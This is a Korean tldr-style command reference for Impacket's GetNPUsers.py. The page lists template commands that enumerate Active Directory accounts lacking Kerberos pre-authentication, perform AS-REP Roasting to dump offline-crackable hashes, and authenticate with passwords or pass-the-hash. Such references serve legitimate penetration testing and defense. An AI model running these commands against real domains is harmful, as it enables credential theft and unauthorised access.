# GetNPUsers.py

> Kerberos 사전 인증이 비활성화된 Active Directory 계정을 열거하며, AS-REP Roasting 공격에 취약할 수 있음.
> Impacket 도구 모음의 일부.
> 더 많은 정보: <https://github.com/fortra/impacket>.

- Kerberos 사전 인증이 비활성화된 사용자 열거 (기본 익명 열거):

`GetNPUsers.py {{도메인}}/ -usersfile {{경로/대상/사용자_목록}} -dc-ip {{도메인_컨트롤러_ip}} -no-pass`

- AS-REP Roasting을 수행하고 오프라인 크래킹 가능한 해시 덤프:

`GetNPUsers.py {{도메인}}/ -usersfile {{경로/대상/사용자_목록}} -dc-ip {{도메인_컨트롤러_ip}} -no-pass -request`

- 익명 바인딩이 비활성화된 경우 유효한 자격 증명으로 인증:

`GetNPUsers.py {{도메인}}/{{username}}:{{password}} -usersfile {{경로/대상/사용자_목록}} -dc-ip {{도메인_컨트롤러_ip}}`

- 비밀번호 대신 pass-the-hash 인증 사용:

`GetNPUsers.py {{도메인}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{경로/대상/사용자_목록}} -dc-ip {{도메인_컨트롤러_ip}}`

- 추가 분석을 위해 출력을 파일로 저장:

`GetNPUsers.py {{도메인}}/ -usersfile {{경로/대상/사용자_목록}} -dc-ip {{도메인_컨트롤러_ip}} -request > {{경로/대상/출력파일.txt}}`
